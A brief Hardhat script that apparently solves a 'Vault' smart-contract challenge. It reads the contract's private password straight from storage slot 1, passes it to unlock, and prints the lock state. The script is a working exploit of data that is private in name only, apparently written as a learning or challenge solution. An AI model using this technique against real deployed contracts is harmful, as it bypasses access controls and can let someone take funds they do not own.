import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0x32467b43BFa67273FC7dDda0999Ee9A12F2AaA08"
const PLAYER_ADDRESS = "0xBcd4042DE499D14e55001CcbB24a551F3b954096"
const ATTACK_ADDRESS = ""

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS)
  const contract = await ethers.getContractAt("Vault", CONTRACT_ADDRESS, signer)

  const password = await ethers.provider.getStorage(CONTRACT_ADDRESS, 1)

  console.log(password)

  await contract.unlock(password)

  console.log(await contract.locked())
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
